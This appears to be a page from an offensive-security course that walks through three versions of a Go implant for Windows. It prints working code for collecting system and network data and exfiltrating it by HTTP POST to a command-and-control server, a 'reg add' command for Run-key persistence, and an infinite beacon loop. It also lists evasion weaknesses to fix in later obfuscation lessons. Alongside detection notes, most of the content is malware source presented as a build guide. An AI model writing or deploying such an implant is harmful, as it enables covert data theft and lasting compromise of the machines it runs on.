v1

net_scan.go — Basic Recon + Single Beacon

Network interfaces · systeminfo · file write · one HTTP POST to C2

Complete
what you're building

The first functional payload. It gathers two types of data — network interfaces using Go's native net package and full system information via systeminfo — writes the output to C:\temp\, and exfiltrates the file to the Flask C2 server with a single HTTP POST. No loop, no persistence. One run, one beacon.

The key lesson here is why Go is used for implant development: one go build command produces a fully static .exe with zero runtime dependencies on the target machine. No Python interpreter, no .NET runtime, nothing to install.

Native API vs exec.Command
v1 introduces both techniques. net.Interfaces() calls the Go standard library directly — no child process is spawned. exec.Command("cmd", "/C", "systeminfo") shells out and creates a visible cmd.exe child process in the process tree. Both approaches appear throughout the series.

key code — sendToC2()
net_scan.go Go 
func sendToC2(url, filepath, hostID string) {
    data, err := os.ReadFile(filepath)
    if err != nil { return }

    req, err := http.NewRequest("POST", url, bytes.NewReader(data))
    if err != nil { return }

    // Custom headers Flask C2 expects
    req.Header.Set("Content-Type", "application/octet-stream")
    req.Header.Set("X-Filename", "recon_combined.txt")
    req.Header.Set("X-Host", hostID)  // identifies target machine

    client := &http.Client{ Timeout: 10 * time.Second }
    resp, err := client.Do(req)
    if err != nil { return }
    defer resp.Body.Close()
}

net_scan_v2.go — Expanded Host Recon

Six additional S-tier and A-tier intelligence commands added on top of v1

Complete
what's new in v2

Version 2 extends the data collection from v1 with six high-value enumeration commands. The architecture — file write, sendToC2(), imports — is completely unchanged. Only the collection section inside main() grows. This additive pattern mirrors real implant development: you start with a minimal working beacon and layer capability on top.

Detection note on wmic: wmic.exe is one of the most heavily monitored executables in enterprise EDR rule sets. Any process spawning wmic as a child is flagged by most commercial EDR products. This is a Pyramid of Pain Artifacts-tier indicator — relatively easy for a defender to block, and equally easy for an attacker to swap out for a PowerShell CIM equivalent.

net_scan_v3.go — Registry Persistence + Beacon Loop

The complete payload — survives reboots, beacons every 60 seconds indefinitely

Complete
what's new in v3

Version 3 is the full operational payload — every feature from v1 and v2 plus two major additions: Windows Registry persistence that survives machine reboots, and an infinite 60-second beacon loop. From this version onward, every obfuscation lesson modifies this file as its base.

key code — persistence
net_scan_v3.go Go 
// Get the binary's own path at runtime — works wherever it's deployed
exePath, _ := os.Executable()

// Write path into HKCU Run key — executes on every user login
regPath := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
persistCmd := fmt.Sprintf(
    `reg add "%s" /v ReconBeacon /t REG_SZ /d "%s" /f`,
    regPath, exePath)
exec.Command("cmd", "/C", persistCmd).Run()

// HKCU = no admin required. Trade-off: only persists for current user.
// "ReconBeacon" value name is a hardcoded IoC — see obfuscation lessons.
key code — beacon loop
net_scan_v3.go Go 
for {  // infinite loop — no condition, runs until process is killed
    timestamp := time.Now().Format("2006-01-02 15:04:05")

    // ... all recon commands run each cycle ...

    sendToC2(c2URL, path, hostname)

    // Fixed 60s sleep — detectable as a beacon pattern by network IDS.

OPSEC weaknesses in v3 (addressed in obfuscation lessons):
(1) C2 URL hardcoded in plaintext — visible with strings.exe
(2) "ReconBeacon" registry value name is a static IoC
(3) Fixed 60s beacon interval is a detectable network pattern
(4) Debug symbols in binary expose function names in Ghidra/Binary Ninja
